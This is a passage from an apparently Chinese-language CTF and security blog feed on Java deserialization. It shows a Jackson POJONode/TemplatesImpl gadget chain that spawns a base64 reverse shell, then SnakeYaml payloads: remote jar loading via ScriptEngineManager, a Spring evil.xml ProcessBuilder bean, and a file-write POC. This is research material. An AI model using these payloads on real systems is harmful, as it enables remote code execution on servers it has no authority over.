java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] code = getTemplates();<span class="hljs-comment">//ç”¨javassistè·å–</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>,  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        System.out.println(serial(val));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;MyTemplate&quot;</span>);<br>        template.setSuperclass(pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        template.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> template.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰“ä¸€æ¬¡hackå³å¯ï¼Œå› ä¸ºååºåˆ—åŒ–å·²ç»æˆåŠŸï¼š</p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211441966.png" alt="image-20240803211441966"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211445638.png" alt="image-20240803211445638"></p><p>äºŒæ¬¡ååºåˆ—åŒ–çš„ç ”ç©¶æˆ‘ä¼šåç»­å†å•å¼€ä¸€ä¸ªæ–‡ç« ï¼Œå› ä¸ºä¹Ÿéå¸¸å…·æœ‰ç ”ç©¶ä»·å€¼ã€‚å¯çœ‹<a href="https://xz.aliyun.com/t/13900?time__1311=GqmxnD2D97itqGNDQieBK4rci1LnEbD">æµ…è°ˆJavaäºŒæ¬¡ååºåˆ—åŒ– - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SnakeYaml</title>
    <link href="/2024/08/03/SnakeYaml/"/>
    <url>/2024/08/03/SnakeYaml/</url>
    
    <content type="html"><![CDATA[<p>SnakeYamlä¹Ÿç®—æ˜¯å¸¸è§çš„åŒ…ï¼Œåœ¨ä¹‹å‰æ‰“é¢˜çš„æ—¶å€™é‡åˆ°è¿‡ï¼Œå›½å†³javaé¢˜ä¸¤é“solonä¹Ÿæœ‰è¿™ä¸ªåŒ…ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>SnakeYamlæ˜¯ä¸€ä¸ªå®Œæ•´çš„YAML1.1è§„èŒƒProcessorï¼Œç”¨äºè§£æYAMLï¼Œåºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–ï¼Œæ”¯æŒUTF-8&#x2F;UTF-16ï¼Œæ”¯æŒJavaå¯¹è±¡çš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–ï¼Œæ”¯æŒæ‰€æœ‰YAMLå®šä¹‰çš„ç±»å‹ã€‚</p><h2 id="Basic-Practice"><a href="#Basic-Practice" class="headerlink" title="Basic Practice"></a>Basic Practice</h2><p>ä¾èµ–å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.yaml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>snakeyaml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.27<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ–¹æ³•ï¼š</p><ul><li>Yaml.load()ï¼šå…¥å‚æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ªJavaå¯¹è±¡</li><li>Yaml.dump()ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºyamlæ–‡ä»¶å½¢å¼</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.snake.demo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Non Arg Constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I am &quot;</span> + name + <span class="hljs-string">&quot;, &quot;</span> + age + <span class="hljs-string">&quot; years old&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;taco&quot;</span>, <span class="hljs-number">18</span>);<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>System.out.println(yaml.dump(user));<br></code></pre></td></tr></table></figure><blockquote><p>æ‰“å°ç»“æœ:</p><p>getName</p><p>!!com.snake.demo.User {age: 18, name: taco}</p></blockquote><p><strong>!!ç”¨äºå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä¸fastjsonä¸­@typeå­—æ®µç±»ä¼¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">dump()è¿˜è°ƒç”¨äº†é<span class="hljs-keyword">public</span>æˆå‘˜çš„getter<br></code></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.snake.demo.User &#123;age: 18, name: taco&#125;&quot;</span>;<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>System.out.println(user);<br></code></pre></td></tr></table></figure><blockquote><p>Non Arg Constructor</p><p>setName</p><p>I am taco, 18 years old</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">load()è°ƒç”¨äº†æ— å‚æ„é€ å™¨å’Œé<span class="hljs-keyword">public</span>æˆå‘˜çš„setter<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šä¸ä»…æ— å‚æ„é€ å™¨èƒ½å¤Ÿè°ƒç”¨ï¼Œè¿˜èƒ½æŒ‡å®šè°ƒç”¨æœ‰å‚æ„é€ å™¨ï¼Œåªè¦ä¼ å‚ç±»å‹ä¸ºæœ‰å‚æ„é€ å™¨çš„å‚æ•°ç±»å‹å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.snake.demo.User [\&quot;taco\&quot;, 18]&quot;</span>;<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>System.out.println(user);<br></code></pre></td></tr></table></figure><blockquote><p>Arg Constructor Called</p><p>I am taco, 18 years old</p></blockquote><p>æ­¤æ—¶å°±ä¸ä¼šè°ƒç”¨<code>setter</code>æ–¹æ³•äº†</p><blockquote><p>è‹¥ç±»å±æ€§æ˜¯publicä¿®é¥°ï¼Œä¸ä¼šè°ƒç”¨å¯¹åº”çš„setteræ–¹æ³•ï¼Œè€Œæ˜¯é€šè¿‡åå°„æ¥set</p></blockquote><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>yamlååºåˆ—åŒ–æ—¶é€šè¿‡<code>!!</code> + å…¨ç±»åæŒ‡å®šååºåˆ—åŒ–çš„ç±»ï¼Œå’Œfastjsonä¸€æ ·éƒ½ä¼šè°ƒç”¨setterï¼Œä¸è¿‡å¯¹äºpublicä¿®é¥°çš„æˆå‘˜ä¸ä¼šè°ƒç”¨å…¶setterï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œsnakeyamlååºåˆ—åŒ–æ—¶è¿˜èƒ½è°ƒç”¨è¯¥ç±»çš„æ„é€ å‡½æ•°ï¼ˆfastjsonæ˜¯é€šè¿‡ASMç”Ÿæˆçš„ï¼‰ã€‚</p><h3 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h3><p>æ„é€ <code>ScriptEngineManager</code>payloadï¼Œåˆ©ç”¨SPIæœºåˆ¶é€šè¿‡<code>URLClassLoader</code>è¿œç¨‹åŠ è½½æ¶æ„å­—èŠ‚ç æ–‡ä»¶ã€‚</p><p>Githubä¸Šé¢çš„EXPï¼š<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>å·¥å…·çš„å·¥ç¨‹classpathä¸‹å­˜åœ¨<code>META-INF/services</code>æ–‡ä»¶å¤¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.script.ScriptEngineFactory<br></code></pre></td></tr></table></figure><blockquote><p>artsploit.AwesomeScriptEngineFactory</p></blockquote><p>æ‰“æˆjaråŒ…</p><blockquote><p>javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java</p><p>jar -cvf yaml-payload.jar -C src&#x2F; .</p></blockquote><p>å°†ç”Ÿæˆyaml-payload.jaråŒ…æ”¾åœ¨webæœåŠ¡ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 9999<br></code></pre></td></tr></table></figure><blockquote><p>!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [â€œ<a href="http://127.0.0.1:9999/yaml-payload.jar%22]">http://127.0.0.1:9999/yaml-payload.jar&quot;]</a> ]] ]</p></blockquote><p><img src="/2024/08/03/SnakeYaml/image-20240803154021356.png" alt="image-20240803154021356"></p><p>è§¦å‘æµç¨‹å¦‚ä¸‹ï¼š</p><p><code>javax.script.ScriptEngineManager</code></p><p><img src="/2024/08/03/SnakeYaml/image-20240803154059167.png" alt="image-20240803154059167"></p><p><img src="/2024/08/03/SnakeYaml/image-20240803154133518.png" alt="image-20240803154133518"></p><p><code>ScriptEngineManager</code>çš„æ— å‚æ„é€ å™¨è°ƒç”¨äº†init()ï¼Œè¿›è¡Œåˆå§‹åŒ–è®¾ç½®åè°ƒç”¨<code>initEngines()</code>ï¼Œç”¨äºåˆå§‹åŒ–è„šæœ¬å¼•æ“ã€‚</p><p>æ¥ç€åˆ°<code>getServiceLoader</code>ï¼Œç”¨äºè·å–<code>ServiceLoader</code>è¿­ä»£å™¨</p><p><img src="/2024/08/03/SnakeYaml/image-20240803154442837.png" alt="image-20240803154442837"></p><p>åˆ°äº†ç†Ÿæ‚‰çš„<code>ServiceLoader.load()</code>è¿”å›ä¸€ä¸ª<code>ServiceLoader&lt;T&gt;</code>ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥è·å–ä¸€ä¸ªè¿­ä»£å™¨ï¼Œæ¥ä¸‹æ¥è¿˜æ˜¯ç†Ÿæ‚‰çš„è¿­ä»£éå†ã€‚</p><p><img src="/2024/08/03/SnakeYaml/image-20240803154716142.png" alt="image-20240803154716142"></p><p><code>next() =&gt; nextService()</code>ä¼šåŠ è½½æ¥å£å®ç°ç±»å¹¶å®ä¾‹åŒ–ï¼Œç½‘ä¸Šæœ‰è¯¦è§£ã€‚</p><h3 id="SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®"><a href="#SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®" class="headerlink" title="SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®"></a>SpringFrameworkè¿œç¨‹åŠ è½½é…ç½®</h3><p>Springå½“ä¸­æœ‰ä¸¤ä¸ªç±»çš„æ„é€ å‡½æ•°è¿œç¨‹åŠ è½½é…ç½®ï¼Œå¯ä»¥æ„æˆRCE</p><blockquote><p>org.springframework.context.support.ClassPathXmlApplicationContext org.springframework.context.support.FileSystemXmlApplicationContext</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exec&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>!!org.springframework.context.support.ClassPathXmlApplicationContext [â€œ<a href="http://127.0.0.1:8888/evil.xml%22]">http://127.0.0.1:8888/evil.xml&quot;]</a></p></blockquote><p>æ—¢ç„¶èƒ½è§¦å‘getterï¼Œé‚£ä¹ˆfastjsonçš„å¤§éƒ¨åˆ†payloadä¹Ÿå¯ä»¥ç”¨ã€‚</p><h3 id="å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar"><a href="#å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar" class="headerlink" title="å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar"></a>å†™æ–‡ä»¶åŠ è½½æœ¬åœ°jar</h3><blockquote><p>!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [â€œfilePathâ€],false],!!java.util.zip.Inflater { input: !!binary base64 },length]]</p></blockquote><p>filepathæ˜¯å†™å…¥è·¯å¾„ï¼Œbase64strä¸ºç»è¿‡zlibå‹ç¼©è¿‡åçš„æ–‡ä»¶å†…å®¹,lengthä¸ºæ–‡ä»¶å¤§å°</p><p>å’Œfastjsonä¸€æ ·ï¼Œå¯¹äºbyteæ•°ç»„ä¼šè‡ªåŠ¨è¿›è¡Œbase64è§£ç (snakeyamlä¸­ä¸ºbinary)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.JavaUtils;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SnakeYamlFilePOC</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoc(<span class="hljs-string">&quot;E:/flag.txt&quot;</span>, <span class="hljs-string">&quot;E:/a.txt&quot;</span>);<br>        System.out.println(poc);<br><span class="hljs-comment">//        Yaml yaml = new Yaml();</span><br><span class="hljs-comment">//        yaml.load(poc);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">createPoc</span><span class="hljs-params">(String src, String path)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] file = JavaUtils.getBytesFromFile(src);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> file.length;<br>        <span class="hljs-type">byte</span>[] compressed = compress(file);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">b64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(compressed);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!sun.rmi.server.MarshalOutputStream &quot;</span> +<br>                <span class="hljs-string">&quot;[!!java.util.zip.InflaterOutputStream [&quot;</span> +<br>                    <span class="hljs-string">&quot;!!java.io.FileOutputStream [&quot;</span> +<br>                        <span class="hljs-string">&quot;!!java.io.File [\&quot;&quot;</span> + path + <span class="hljs-string">&quot;\&quot;],false],&quot;</span> +<br>                        <span class="hljs-string">&quot;!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span> + b64 + <span class="hljs-string">&quot; &#125;, &quot;</span> + length +<br>                        <span class="hljs-string">&quot;]]&quot;</span>;<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] compress(<span class="hljs-type">byte</span>[] input) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">deflater</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();<br>        deflater.setInput(input);<br>        deflater.finish();<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> (!deflater.finished()) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">compressedSize</span> <span class="hljs-operator">=</span> deflater.deflate(buffer);<br>            outputStream.write(buffer, <span class="hljs-number">0</span>, compressedSize);<br>        &#125;<br><br>        outputStream.close();<br>        <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ—¢ç„¶å¯ä»¥å†™æ–‡ä»¶ï¼Œé‚£å°±æŠŠjarå†™å…¥ç›®æ ‡ç¯å¢ƒï¼Œç„¶åå†é€šè¿‡URLClassloaderæœ¬åœ°åŠ è½½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 